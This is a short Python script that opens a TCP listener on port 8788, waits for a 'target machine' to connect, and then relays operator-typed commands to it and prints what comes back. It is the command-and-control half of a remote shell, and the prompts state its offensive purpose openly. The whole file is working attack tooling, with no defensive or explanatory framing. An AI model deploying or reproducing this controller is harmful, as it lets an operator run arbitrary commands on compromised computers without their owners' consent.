import socket

if __name__ == "__main__":
    serverIP = "0.0.0.0"
    port = 8788

    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sevrerSocketAddress = (serverIP, port)
    serverSocket.bind(sevrerSocketAddress)

    serverSocket.listen(5)

    print(f"Listening for all incoming client connections on port {port} ...")

    targetSocket, targetAddress = serverSocket.accept()
    print(f"NEW CONNECTION from: {targetAddress}")

    while True:
        command = input(
            "Enter command to run on target machine OR 'exit' to quit: ")
        targetSocket.send(command.encode())

        if command.lower() == "exit":
            break

        response = targetSocket.recv(1024).decode()

        print(f"Received response from target machine: {response}")

    targetSocket.close()
    serverSocket.close()
